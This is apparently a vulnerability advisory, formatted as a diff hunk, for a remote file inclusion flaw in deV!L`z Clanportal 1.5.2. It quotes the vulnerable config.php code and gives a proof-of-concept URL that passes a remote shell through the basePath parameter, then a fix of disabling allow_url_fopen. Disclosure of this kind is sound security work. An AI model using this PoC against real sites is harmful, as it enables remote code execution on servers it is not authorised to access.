@@ -1,0 +1,27 @@
+[+]  deV!L`z Clanportal 1.5.2 Remote File Include Vulnerability
+[+] Discovered By: cr4wl3r
+[+] Download: http://www.dzcp.de/downloads/?action=download&id=131
+[x] Code in [dzcp1.5.2/inc/config.php]
+
+## REQUIRES ##
+require_once($basePath."/inc/mysql.php");  <--- RFI
+
+function show($tpl, $array)
+{
+  global $tmpdir;
+    $template = "../inc/_templates_/".$tmpdir."/".$tpl;
+  
+    if($fp = @fopen($template.".".html, "r"))
+      $tpl = @fread($fp, filesize($template.".".html));
+    
+    $array['dir'] = '../inc/_templates_/'.$tmpdir;
+    foreach($array as $value => $code)
+    {
+      $tpl = str_replace('['.$value.']', $code, $tpl);
+    }
+  return $tpl;
+}
+
+[+] PoC: [path]/inc/config.php?basePath=[Shell]
+
+[+] Solution: Change php.ini and set allow_url_fopen to Off
